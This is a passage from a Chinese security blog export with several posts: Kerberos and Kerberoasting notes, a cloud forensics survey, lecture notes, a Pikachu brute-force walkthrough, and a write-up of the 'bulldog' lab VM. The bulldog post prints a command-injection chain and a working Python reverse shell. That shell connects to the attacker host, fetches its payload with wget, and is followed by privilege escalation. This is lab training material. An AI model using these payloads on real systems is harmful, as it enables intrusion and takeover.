<p>Client -&gt;TGS 发送 Authenticator2 (sessionkey-as 加密 TimeStamp) 和票据 TGT(KRBTGT HASH 加密的 sessionkey-as 和 TimeStamp)</p>
<p>Client 接收到了加密后的 Sessionkey-as 和 TGT 之后，用自身密码解密得到 Sessionkey-as，TGT 是由 KDC 密码加密，Client 无法解密。这时 Client 再用 Sessionkey-as 加密 TimeStamp 和 TGT 一起发送给 KDC 中的 TGS（TicketGranting Server）票据授权服务器换取能够访问 Server 的票据。</p>
<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/6.jpg"></p>
<p>KRB_TGS_REP</p>
<p>TGS-&gt; Client 发送 密文 1(sessionkey-as 加密 sessionkey-tgs) 和 票据 ST(Server 密码 HASH 加密 sessionkey-tgs)</p>
<p>TGS 收到 Client 发送过来的 TGT 和 Sessionkey-as 加密的 TimeStamp 之后，首先会检查自身是否存在 Client 所请求的服务。如果服务存在，则用 KRBTGT 密码解密 TGT。一般情况下 TGS 会检查 TGT 中的时间戳查看 TGT 是否过期，且原始地址是否和 TGT 中保存的地址相同。验证成功之后将用 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 HASH 加密的 Sessionkey-tgs 发送给 Client。</p>
<p><strong>(3)TheClient/Server Authentication Exchange</strong></p>
<p>KRB_AP_REQ</p>
<p>Client -&gt;Server 发送 Authenticator3(sessionkey-tgs 加密 TimeStamp) 和票据 ST(Server 密码 HASH 加密 sessionkey-tgs)</p>
<p>Client 收到 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 HASH 加密的 sessionkey-tgs 之后用 sessionkey-as 解密得到 sessionkey-tgs，然后把 sessionkey-tgs 加密的 TimeStamp 和 ST 一起发送给 Server。</p>
<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/7.jpg"></p>
<h1 id="0x02-Kerberoasting-对kerberos的渗透"><a href="#0x02-Kerberoasting-对kerberos的渗透" class="headerlink" title="0x02 Kerberoasting-对kerberos的渗透"></a>0x02 Kerberoasting-对kerberos的渗透</h1><p>在整个渗透的过程当中，KDC密钥分发中心是我们渗透的重点，因为KDC存储了域中所有用户的密码哈希。    </p>
<p>介绍 Kerberos 的认证流程时说到，在 KRB_TGS_REP 中，TGS 会返回给 Client 一张票据 ST，而 ST 是由 Client 请求的 Server 端密码进行加密的。当 Kerberos 协议设置票据为 RC4 方式加密时，我们就可以通过爆破在 Client 端获取的票据 ST，从而获得 Server 端的密码。</p>
<p>下图为设置 Kerberos 的加密方式，在域中可以在域控的「本地安全策略」中进行设置：</p>
<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/17.jpg"></p>
<p>设置RC4 方式加密。</p>
<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/18.jpg"></p>
<p>设置完成之后运行里输入「gpupdate」刷新组策略，策略生效。</p>
<h1 id="0x0-参考"><a href="#0x0-参考" class="headerlink" title="0x0 参考"></a>0x0 参考</h1><p><a href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos.html">https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos.html</a></p>
<p><a href="https://www.freebuf.com/articles/system/196434.html">https://www.freebuf.com/articles/system/196434.html</a></p>
<p><a href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-SPN.html">https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-SPN.html</a></p>
<p><a href="https://www.notion.so/e977d98f5bd740db87ac4e5cae38a442#57ac8897745f4a05a570415401ee7d5f">https://www.notion.so/e977d98f5bd740db87ac4e5cae38a442#57ac8897745f4a05a570415401ee7d5f</a></p>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>域渗透</tag>
        <tag>kerberos</tag>
        <tag>金票</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算取证综述</title>
    <url>/2021/05/22/%E4%BA%91%E8%AE%A1%E7%AE%97%E5%8F%96%E8%AF%81%E7%BB%BC%E8%BF%B0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于目前所做项目及论文的原因(具体不便细说)，需要调研云取证，刚好在此做一总结。本篇文章主要是对云环境中电子数据的分析技术作以总结。</p>
<h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><p>Ruan K教授从技术、组织和法律三个维度划分云取证领域相关问题。</p>
<ul>
<li>技术维度：云计算环境中进行电子数据取证的具体过程和试用的技术和工具。</li>
<li>组织维度：云计算环境中包含的角色，包括云服务提供商、云服务用户、云服务中介、审计人员和取证人员，不同的角色在云取证活动中的职责不同，他们之间的交互可以促进云取证的实施。法律维度主要关注在涉及跨多个管辖区的法律问题。</li>
</ul>
<p>云计算在电子取证领域的领域包括定位电子数据所在虚拟机的物理位置、设计云取证模型等。设计云取证模型是当前云取证研究的主要方向之一，对于云取证工作具有重要的指导意义。本文主要研究云中电子数据的分析技术。</p>
<h1 id="0x02-云计算-Cloud-Computing"><a href="#0x02-云计算-Cloud-Computing" class="headerlink" title="0x02 云计算(Cloud Computing)"></a>0x02 云计算(Cloud Computing)</h1><p>云计算可以看作是并行计算、分布式计算和网格计算等计算机技术和网络技术的融合和发展。简单来说，云计算是通过网<br>络将庞大的计算处理程序自动分拆成无数个较小的子程序，再交由多部服务器所组成的庞大系统，经搜寻、计算、分析之后将<br>处理结果回传给用户。使用这项技术，网络服务提供者可以在数秒之内，达成处理数以千万计甚至亿计的信息，达到和超级计算<br>机同样强大效能的网络服务。  </p>
<h1 id="0x03-云环境中电子数据的分析技术研究"><a href="#0x03-云环境中电子数据的分析技术研究" class="headerlink" title="0x03 云环境中电子数据的分析技术研究"></a>0x03 云环境中电子数据的分析技术研究</h1><p>云环境下的电子数据分析：<strong>取证调查人员借助工具、算法对涉案的电子数据进行分析</strong>的过程。主要包括</p>
<ul>
<li>数据源分析</li>
<li>数据恢复</li>
<li>事件重构</li>
<li>数据检索</li>
</ul>
<p>云环境中的电子数据量大、数据格式多、多源证据时间戳不一致、网络环境复杂等特性为分析证据带来极大的挑战。</p>
<ol>
<li><p>数据量巨大：目前的研究思路已经从<strong>分析所有数据的取证</strong>转变为<strong>用机器学习分析取证</strong>；</p>
</li>
<li><p>数据源分析困难：借助SDN网络取证分析来实现网络攻击溯源；</p>
</li>
</ol>
<p>然而目前提出的方法均存在局限性，无法有效解决目前的困境。云环境中电子数据的分析方法臻待进一步研究。</p>
<h4 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h4><ol>
<li><a href="https://www.secrss.com/articles/11419">https://www.secrss.com/articles/11419</a></li>
</ol>
]]></content>
      <tags>
        <tag>cloud computing forensics</tag>
        <tag>云取证</tag>
        <tag>计算机取证</tag>
        <tag>电子数据取证</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试之bulldog</title>
    <url>/2021/05/05/bulldog/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今日突然冒出渗透靶机的想法，突然一看，前人早已栽好了树。</p>
<p>每日分享：原来在孩提时期就已经看过余华的活着，只是当时读懂活着的人不是我。</p>
<p>小狗拼命的想叫醒他的同伴，可他还不知道同伴可能再也醒不过来了</p>
<p>每天都有人跟你一样在注视着生活中的点滴</p>
<p>最后献上红楼的一句箴言：假亦真时真亦假，无为有处有还无</p>
<p>不知道既喜欢红楼又喜欢昆曲，把后半辈子都献给教授外国人红楼梦的他，心境又是如何呢</p>
<p>人生本来就是尝试的过程，正确与否在你以为</p>
<p>也罢，继续写博客辽</p>
<h1 id="0x01-资产收集"><a href="#0x01-资产收集" class="headerlink" title="0x01 资产收集"></a>0x01 资产收集</h1><p>靶机：Ubuntu16.04：192.168.127.134</p>
<p>攻击机：kali 2021.1：192.168.127.133</p>
<p>愣是想不起来这个命令叫啥：lsb_release -a</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 主机发现</span></span><br><span class="line"><span class="comment"># ping scan</span></span><br><span class="line">nmap -sn 192.168.127.0/24</span><br><span class="line"></span><br><span class="line"><span class="comment"># 端口扫描</span></span><br><span class="line">masscan --rate=10000 --ports 0-65535 192.168.127.134</span><br><span class="line"></span><br><span class="line"><span class="comment"># 探究端口服务</span></span><br><span class="line">nmap -sV -T4 -O -p 23,80,8080 192.168.127.134</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/05/bulldog/1.png"></p>
<p>可以看到python版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 扫描子域名</span></span><br><span class="line">dirb http://192.168.127.134</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/05/bulldog/2.png"></p>
<p>去康康admin和dev分别是什么服务。访问admin会看到无验证码的登陆界面，而dev必须登陆之后才可以看到。</p>
<p>dev页面有多个邮箱，去康康dev的源码，可能会md5加密的密码存储，一看还真有。解密之后尝试登陆admin页面，发现后两个账号可以登陆进去。不过账号是邮箱的前面，也就是姓名，登陆进去之后，发现dev界面的web shell也有了权限。其实这个界面类似于拿到一台被限制命令白名单的机子。尝试绕过吧。</p>
<p><img src="/2021/05/05/bulldog/4.png"></p>
<h1 id="0x02-漏洞检测"><a href="#0x02-漏洞检测" class="headerlink" title="0x02 漏洞检测"></a>0x02 漏洞检测</h1><p><strong>远程命令执行漏洞检测</strong>：</p>
<p>使用;同时执行多个命令，被过滤；</p>
<p>使用**&amp;,&amp;&amp;,|**同时执行多个命令,成功。</p>
<p>查看敏感目录，发现3个用户：<br><img src="/2021/05/05/bulldog/3.png"></p>
<h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><p>试试反弹shell：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在kali的/var/html/www目录下，搭建web服务</span></span><br><span class="line">python -m SimpleHTTPServer 80</span><br><span class="line"><span class="meta">#</span><span class="bash"> 攻击机监听1234端口</span></span><br><span class="line">nc -lvnp 1234</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机执行wget命令尝试连接</span></span><br><span class="line">pwd &amp; wget http://192.168.127.133</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机下载shell文件</span></span><br><span class="line">ls &amp; wget http://192.168.56.133/shell.py</span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机执行shell</span></span><br><span class="line">ls &amp; python shell.py</span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机删除shell</span></span><br><span class="line">ls &amp; rm -rf shell.py</span><br></pre></td></tr></table></figure>

<p>其中反弹shell脚本shell.py内容如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="comment"># create an INET, STREAMing socket</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># now connect to the web server on port 1234</span></span><br><span class="line">s.connect((<span class="string">&quot;192.168.127.133&quot;</span>, <span class="number">1234</span>))</span><br><span class="line">os.dup(s.fileno(), <span class="number">0</span>)</span><br><span class="line">os.dup(s.fileno(), <span class="number">1</span>)</span><br><span class="line">os.dup(s.fileno(), <span class="number">2</span>)</span><br><span class="line">p = subprocess.call([<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&#x27;-i&#x27;</span>])</span><br></pre></td></tr></table></figure>



<p><img src="/2021/05/05/bulldog/5.png"></p>
<p>进入home，查看其他用户:bulldogadmin  django</p>
<p>进入bulldogadmin，查看所有文件，此时还是ls -la找到隐藏目录.hiddenadmindirectory。找到可执行文件customPermissionApp。<strong>strings</strong>查看其中字符</p>
<p><img src="/2021/05/05/bulldog/6.png"></p>
<p>猜测密码SUPERultimatePASSWORDyouCANTget。不过此处H到底代表什么暂时还不清楚。</p>
<h1 id="0x04-提权-后门维持"><a href="#0x04-提权-后门维持" class="headerlink" title="0x04  提权/后门维持"></a>0x04  提权/后门维持</h1><p>此时无法提权，需要打开新终端</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开新终端</span></span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="comment"># 提权</span></span><br><span class="line">sudo -i</span><br></pre></td></tr></table></figure>

<h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05  总结"></a>0x05  总结</h1><ol>
<li><p>习惯查看网页源码以及查看bash下所有文件<strong>ls -la</strong></p>
</li>
<li><p>&amp;&amp;   &amp;    |的妙用</p>
</li>
<li><p>当cat查看某些文件出现乱码时，可以考虑用strings</p>
</li>
<li><p>一般反弹的shell不如终端，一般拿到后都先用python弹一个终端出来</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty; pty.spawn(&quot;</span>/bin/bash<span class="string">&quot;)&quot;</span></span><br><span class="line">sudo -i</span><br></pre></td></tr></table></figure></li>
<li><p>反弹shell过程</p>
</li>
<li><p>知识点总结：</p>
<ul>
<li><p>Python -m ：mod,run library module  as  a   script</p>
</li>
<li><p>SimpleHTTPServe：use Python SimpleHTTPServer to turn any directory into a simple HTTP web server.</p>
</li>
<li><p>python http服务器运行在80端口</p>
</li>
<li><p>nmap -sn：ping scan</p>
</li>
<li><p>masscan –rate=10000 –ports 0-65535 192.168.127.134：</p>
<p>–rate=10000  意思是10kpps(packet per second)，每秒一万个数据包</p>
</li>
<li><p>wget：非交互式网络文件下载工具</p>
</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>提权</tag>
        <tag>渗透测试</tag>
        <tag>反弹shell</tag>
        <tag>远程命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>方滨兴院士讲座有感</title>
    <url>/2021/04/29/%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E8%AE%B2%E5%BA%A7%E6%9C%89%E6%84%9F/</url>
    <content><![CDATA[<h1 id="什么是六论视觉"><a href="#什么是六论视觉" class="headerlink" title="什么是六论视觉"></a>什么是六论视觉</h1><p>六论视觉：强弱是相对论,知识是认识论(敢闯无人区),失败是实践论,决策是矛盾论(多目标,化解矛盾才是最重要的),发展是进化论,管理是方法论(球不能停在自己脚下)</p>
<p>网络安全人才的培养的六论视觉：能力是相对论,安全是认识论,攻防是实践论,选择是矛盾论,水平是进化论,鉴别是进化论.</p>
<ol>
<li>安全是认识论：<br>超过5000就构成犯罪。所以会用到靶场(类比少林弟子)。</li>
</ol>
<h1 id="人才培养"><a href="#人才培养" class="headerlink" title="人才培养"></a>人才培养</h1><p><strong>技能：知识(西电)+方法(方班)</strong></p>
<ul>
<li><p>知识：事实 常识 规则</p>
</li>
<li><p>方法：思辨 质疑 创新</p>
<p>迅速适应企业的要求，迅速补上知识。自信的提升就是方法的提升。我觉得这么干是对的就是对的。美国一直行走在无人区。也要抬头看看是否真的无人，不怕走无人区，睁大眼睛可能有人做得比我好。</p>
<p>思辨：如小萁所言，把查到得信息变为知识为思辨的过程。需要训练。思辨才是看难文章的敲门砖。你最会什么?你最懂的知道什么？把一件事思辨的搞明白。会思辨之后，再看顶会(挑战难度)。听完之后，迅速提炼自己的问题。保证心里有预期答案。为什么没按。不应该有答案，也是提高。特别坚信他是错的。每次讲完做总结。</p>
</li>
</ul>
<h1 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h1><p>靶场：vulhub  pikachu  raven  sqli-lab</p>
<p>内打内属于靶场(CTF)；内打外属于护网；外打外属于系统测试(方班演武堂)；外打内设备测试(大量人众测)。</p>
<p>军队搞CTF赛很奇葩，每年参加CTF没什么意义(相当于奥赛其实，对于初学者)，为了比赛而比赛不可取，应该参与真正的实战。</p>
<p>没有xss等。看的是逻辑漏洞，整个认证是在前端，认证应该在后端。改了应用程序，只看底层造成的。</p>
<p>不要培养专职的CTF选手。仅限在学校</p>
<h1 id="自我提高"><a href="#自我提高" class="headerlink" title="自我提高"></a>自我提高</h1><p><strong>最牛的要真的牛</strong></p>
<h2 id="状态："><a href="#状态：" class="headerlink" title="状态："></a>状态：</h2><p>有一个做的特别深,便会知道怎么做.</p>
<p>每天激情状态</p>
<p>需要空闲期去考虑自己下一步要做什么，单目标函数还是双目标函数。</p>
<p>喜欢理论支持博士，喜欢实践鼓励创业</p>
<p>先去公司就业，积累资源、人脉，然后去创业。</p>
<h2 id="目标："><a href="#目标：" class="headerlink" title="目标："></a>目标：</h2><p>靶场–&gt;对应的CTF赛题–&gt;实战、SRC。哪块弱补哪块。</p>
<h2 id="安排："><a href="#安排：" class="headerlink" title="安排："></a>安排：</h2><ol>
<li><strong>对于自己：各种靶场训练，然后实操。</strong></li>
<li><strong>redis–&gt;渗透测试 搞清楚，一步一步来</strong></li>
<li>去拿到各种SRC的证书。</li>
<li>知识积累，突变（量变转质变）web后期一定会是二进制.–横向贯彻(各个方向都要)</li>
<li>未接触领域,善于找标签:岗位体系–&gt;需要什么知识体系–&gt;将自己的标签和他对应上。标签需要很详细到某方面,类似于安全设备配置这样,而不是安全配置.</li>
<li>每天一篇：电子取证领域的论文</li>
</ol>
<h3 id="为何高分低能？"><a href="#为何高分低能？" class="headerlink" title="为何高分低能？"></a>为何高分低能？</h3><p>考试是采样,高分低能就是这样.采样是点,然而交流或者应用是连续.采样题是无聊的,宽泛的,面试其实也是,都是连续交流,其实开卷反而更难.</p>
<p>参考：</p>
<p>认证业务平台:<a href="http://cstc.cncstea.cn/">http://cstc.cncstea.cn</a></p>
<p><a href="http://examanage.cncstea.cn/">http://examanage.cncstea.cn</a></p>
<p>​    </p>
]]></content>
      <tags>
        <tag>讲座</tag>
        <tag>从六论视觉谈网络安全人才的培养</tag>
        <tag>方滨兴院士</tag>
      </tags>
  </entry>
  <entry>
    <title>pikachu靶场通关指南(一)</title>
    <url>/2021/04/28/pikachu/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近需要找实习了，来Pikachu靶场再复习一下重要类型的漏洞，具体搭建指南网上应有尽有，此处不再赘述。</p>
<h1 id="Burt-Force"><a href="#Burt-Force" class="headerlink" title="Burt Force"></a>Burt Force</h1><h3 id="相关："><a href="#相关：" class="headerlink" title="相关："></a>相关：</h3><p>安全认证策略:<br>用户密码设置是否足够复杂</p>
<p>每次认证是否使用安全验证码</p>
<p>对尝试登陆的行为是否进行判断和限制(连续5次错误登陆锁定账号等)</p>
<p>是否采用双因素认证</p>
<h3 id="经验："><a href="#经验：" class="headerlink" title="经验："></a>经验：</h3><h4 id="暴力破解流程"><a href="#暴力破解流程" class="headerlink" title="暴力破解流程"></a>暴力破解流程</h4><ul>
<li>找到登录接口的脆弱性<ul>
<li>尝试登录—抓包—观察验证元素和response，判断是否可以暴力破解</li>
</ul>
</li>
<li>优化字典</li>
<li>自动化工具</li>
</ul>
<h4 id="生成高效字典"><a href="#生成高效字典" class="headerlink" title="生成高效字典"></a>生成高效字典</h4><ul>
<li>比如常用的用户名/密码TOP500</li>
<li>脱裤后的账号密码（社工库）</li>
<li>根据特定的对象（比如手机、生日和银行卡号等）按照指定的规则来生成密码</li>
</ul>
<h4 id="字典优化技巧"><a href="#字典优化技巧" class="headerlink" title="字典优化技巧"></a>字典优化技巧</h4><ul>
<li>根据注册提示进行优化，如注册要求密码8位以上，就去掉少于8位的密码</li>
<li>爆破管理后台时，账号是 admin / administrator / root 的可能性较高</li>
</ul>
<h2 id="验证码绕过-on-server-服务器"><a href="#验证码绕过-on-server-服务器" class="headerlink" title="验证码绕过(on server)服务器"></a>验证码绕过(on server)服务器</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;用户名不能为空&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$html</span> .= <span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;密码不能为空&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;vcode&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$html</span> .= <span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;验证码不能为空哦！&lt;/p&gt;&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//              验证验证码是否正确</span></span><br><span class="line">                <span class="keyword">if</span> (strtolower(<span class="variable">$_POST</span>[<span class="string">&#x27;vcode&#x27;</span>]) != strtolower(<span class="variable">$_SESSION</span>[<span class="string">&#x27;vcode&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="variable">$html</span> .= <span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;验证码输入错误哦！&lt;/p&gt;&quot;</span>;</span><br><span class="line">                    <span class="comment">//应该在验证完成后,销毁该$_SESSION[&#x27;vcode&#x27;]</span></span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">                    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">                    <span class="variable">$vcode</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;vcode&#x27;</span>];</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$sql</span> = <span class="string">&quot;select * from users where username=? and password=md5(?)&quot;</span>;</span><br><span class="line">                    <span class="variable">$line_pre</span> = <span class="variable">$link</span>-&gt;prepare(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$line_pre</span>-&gt;bind_param(<span class="string">&#x27;ss&#x27;</span>,<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$line_pre</span>-&gt;execute())&#123;</span><br><span class="line">                        <span class="variable">$line_pre</span>-&gt;store_result();</span><br><span class="line">                        <span class="comment">//虽然前面做了为空判断,但最后,却没有验证验证码!!!</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$line_pre</span>-&gt;num_rows()==<span class="number">1</span>)&#123;</span><br><span class="line">                            <span class="variable">$html</span>.=<span class="string">&#x27;&lt;p&gt; login success&lt;/p&gt;&#x27;</span>;</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="variable">$html</span>.= <span class="string">&#x27;&lt;p&gt; username or password is not exists～&lt;/p&gt;&#x27;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="variable">$html</span>.= <span class="string">&#x27;&lt;p&gt;执行错误:&#x27;</span>.<span class="variable">$line_pre</span>-&gt;errno.<span class="string">&#x27;错误信息:&#x27;</span>.<span class="variable">$line_pre</span>-&gt;error.<span class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>源码中比较完验证码后，并没有销毁该验证码。所以猜测验证码一直有效，可以不停重放数据包。</p>
<p>所以可以通过验证码重放，来绕过验证码爆破用户民共和密码。</p>
<p><img src="/2021/04/28/pikachu/1.png"></p>
<p><img src="/2021/04/28/pikachu/2.jpg"></p>
<p><img src="/2021/04/28/pikachu/3.png"></p>
<p>成功爆破出目前pikachu的用户及密码</p>
<h2 id="验证码绕过-on-client-服务器"><a href="#验证码绕过-on-client-服务器" class="headerlink" title="验证码绕过(on client)服务器"></a>验证码绕过(on client)服务器</h2><p>可以看到用js生成随机字符作为验证码候选，然后创建验证码并进行验证。所以在本案例下，可利用知道用户名或密码的前提下，可以对另一个参数进行暴力枚举。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;javascript&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> code; <span class="comment">//在全局 定义验证码</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createCode</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> codeLength = <span class="number">5</span>;<span class="comment">//验证码的长度</span></span><br><span class="line">        <span class="keyword">var</span> checkCode = <span class="built_in">document</span>.getElementById(<span class="string">&quot;checkCode&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> selectChar = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>);<span class="comment">//所有候选组成验证码的字符，当然也可以用中文的</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; codeLength; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> charIndex = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">36</span>);</span><br><span class="line">            code += selectChar[charIndex];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//alert(code);</span></span><br><span class="line">        <span class="keyword">if</span> (checkCode) &#123;</span><br><span class="line">            checkCode.className = <span class="string">&quot;code&quot;</span>;</span><br><span class="line">            checkCode.value = code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> inputCode = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#bf_client .vcode&#x27;</span>).value;</span><br><span class="line">        <span class="keyword">if</span> (inputCode.length &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            alert(<span class="string">&quot;请输入验证码！&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (inputCode != code) &#123;</span><br><span class="line">            alert(<span class="string">&quot;验证码输入错误！&quot;</span>);</span><br><span class="line">            createCode();<span class="comment">//刷新验证码</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    createCode();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Token防爆破"><a href="#Token防爆破" class="headerlink" title="Token防爆破"></a>Token防爆破</h2><p>抓包发现有 token</p>
<p><img src="/2021/04/28/pikachu/3.jpg"></p>
<p>Repeater后可以看到返回包里有新的 token，即下一次登陆要使用的 token 值在此次登陆的返回包里，而且是明文传输，所以爆破时一定是单线程。</p>
<p><img src="/2021/04/28/pikachu/4.jpg"></p>
<p>intruder模块：设置Grep Extract</p>
<p><img src="/2021/04/28/pikachu/5.jpg"></p>
<p>设置线程为1</p>
<p><img src="/2021/04/28/pikachu/6.jpg"></p>
<p><img src="/2021/04/28/pikachu/7.jpg"></p>
